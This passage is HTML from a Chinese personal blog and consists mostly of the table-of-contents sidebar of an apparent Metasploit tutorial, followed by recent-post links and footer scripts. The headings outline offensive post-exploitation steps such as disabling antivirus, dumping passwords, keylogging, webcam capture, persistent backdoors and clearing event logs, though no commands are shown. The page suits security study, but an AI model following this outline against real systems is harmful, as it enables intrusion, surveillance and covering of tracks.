6.3 使用Exploit漏洞利用模块对漏洞进行利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64-payload%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%A8%A1%E5%9D%97"><span class="toc-number">4.6.4.</span> <span class="toc-text"> 6.4 Payload攻击载荷模块：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="toc-number">4.7.</span> <span class="toc-text"> 7. 后渗透阶段：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#71-post-%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">4.7.1.</span> <span class="toc-text"> 7.1 Post 后渗透模块：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#72-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A"><span class="toc-number">4.7.2.</span> <span class="toc-text"> 7.2 查看主机是否运行在虚拟机上:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#73-%E5%85%B3%E9%97%AD%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="toc-number">4.7.3.</span> <span class="toc-text"> 7.3 关闭杀毒软件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#74-%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">4.7.4.</span> <span class="toc-text"> 7.4 获取目标主机的详细信息：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#75-%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">4.7.5.</span> <span class="toc-text"> 7.5 访问文件系统：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#76-%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">4.7.6.</span> <span class="toc-text"> 7.6 上传&#x2F;下载文件：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#761-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">4.7.6.1.</span> <span class="toc-text"> 7.6.1 下载文件：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#762-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">4.7.6.2.</span> <span class="toc-text"> 7.6.2 上传文件：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#77-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.7.7.</span> <span class="toc-text"> 7.7 权限提升：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#78-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">4.7.8.</span> <span class="toc-text"> 7.8 获取用户密码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#79-%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">4.7.9.</span> <span class="toc-text"> 7.9 运行程序：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#711-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE"><span class="toc-number">4.7.10.</span> <span class="toc-text"> 7.11 屏幕截图：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#712-%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E8%B4%A6%E5%8F%B7"><span class="toc-number">4.7.11.</span> <span class="toc-text"> 7.12 创建一个新账号：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#713-%E5%90%AF%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">4.7.12.</span> <span class="toc-text"> 7.13 启用远程桌面：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#714-%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">4.7.13.</span> <span class="toc-text"> 7.14 键盘记录：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#715-%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-number">4.7.14.</span> <span class="toc-text"> 7.15 进程迁移：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#716-%E7%A6%81%E6%AD%A2%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%BD%BF%E7%94%A8%E9%94%AE%E7%9B%98%E9%BC%A0%E6%A0%87"><span class="toc-number">4.7.15.</span> <span class="toc-text"> 7.16 禁止目标主机使用键盘鼠标：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#717-%E7%94%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%91%84%E5%83%8F%E5%A4%B4%E6%8B%8D%E7%85%A7"><span class="toc-number">4.7.16.</span> <span class="toc-text"> 7.17 用目标主机摄像头拍照：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#718-%E5%B8%B8%E7%94%A8%E6%89%A9%E5%B1%95%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.7.17.</span> <span class="toc-text"> 7.18 常用扩展库介绍：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#7181-loaduse%E5%91%BD%E4%BB%A4"><span class="toc-number">4.7.17.1.</span> <span class="toc-text"> 7.18.1 load&#x2F;use命令：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7182-run%E5%91%BD%E4%BB%A4"><span class="toc-number">4.7.17.2.</span> <span class="toc-text"> 7.18.2 run命令：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#719-%E7%94%9F%E6%88%90%E6%8C%81%E7%BB%AD%E6%80%A7%E5%90%8E%E9%97%A8"><span class="toc-number">4.7.18.</span> <span class="toc-text"> 7.19 生成持续性后门：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#7191-%E5%90%AF%E5%8A%A8%E9%A1%B9%E5%90%AF%E5%8A%A8"><span class="toc-number">4.7.18.1.</span> <span class="toc-text"> 7.19.1 启动项启动：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7192-%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8"><span class="toc-number">4.7.18.2.</span> <span class="toc-text"> 7.19.2 服务启动：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#720-%E8%AE%BE%E7%BD%AEsocks%E4%BB%A3%E7%90%86"><span class="toc-number">4.7.19.</span> <span class="toc-text"> 7.20 设置Socks代理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#721-portfwd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.7.20.</span> <span class="toc-text"> 7.21 portfwd端口转发：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#722-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97"><span class="toc-number">4.7.21.</span> <span class="toc-text"> 7.22 清除事件日志：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%AF%BC%E5%85%A5%E5%B9%B6%E6%89%A7%E8%A1%8Cpowershell%E8%84%9A%E6%9C%AC"><span class="toc-number">4.8.</span> <span class="toc-text"> 8. 导入并执行PowerShell脚本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E5%8A%A0%E8%BD%BDstdapi"><span class="toc-number">4.9.</span> <span class="toc-text"> 9. 加载stdapi：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%8D%87%E7%BA%A7session"><span class="toc-number">4.10.</span> <span class="toc-text"> 10. 升级Session：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/14/3109378657.html" title="AWD总结"><img src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AWD总结"/></a><div class="content"><a class="title" href="/2023/06/14/3109378657.html" title="AWD总结">AWD总结</a><time datetime="2023-06-14T13:22:24.000Z" title="发表于 2023-06-14 21:22:24">2023-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/07/145585172.html" title="DingDing视频下载"><img src="https://s2.loli.net/2022/04/08/3sgAHoqV2mdCzU1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DingDing视频下载"/></a><div class="content"><a class="title" href="/2023/04/07/145585172.html" title="DingDing视频下载">DingDing视频下载</a><time datetime="2023-04-07T00:15:20.000Z" title="发表于 2023-04-07 08:15:20">2023-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/24/120606809.html" title="Vue3学习"><img src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vue3学习"/></a><div class="content"><a class="title" href="/2023/03/24/120606809.html" title="Vue3学习">Vue3学习</a><time datetime="2023-03-24T00:41:14.000Z" title="发表于 2023-03-24 08:41:14">2023-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/791080604.html" title="MSF使用教程"><img src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MSF使用教程"/></a><div class="content"><a class="title" href="/2023/03/16/791080604.html" title="MSF使用教程">MSF使用教程</a><time datetime="2023-03-16T07:12:11.000Z" title="发表于 2023-03-16 15:12:11">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/1905692189.html" title="2022长安杯"><img src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022长安杯"/></a><div class="content"><a class="title" href="/2023/03/16/1905692189.html" title="2022长安杯">2022长安杯</a><time datetime="2023-03-16T07:08:15.000Z" title="发表于 2023-03-16 15:08:15">2023-03-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By like4h</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">like4h's blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>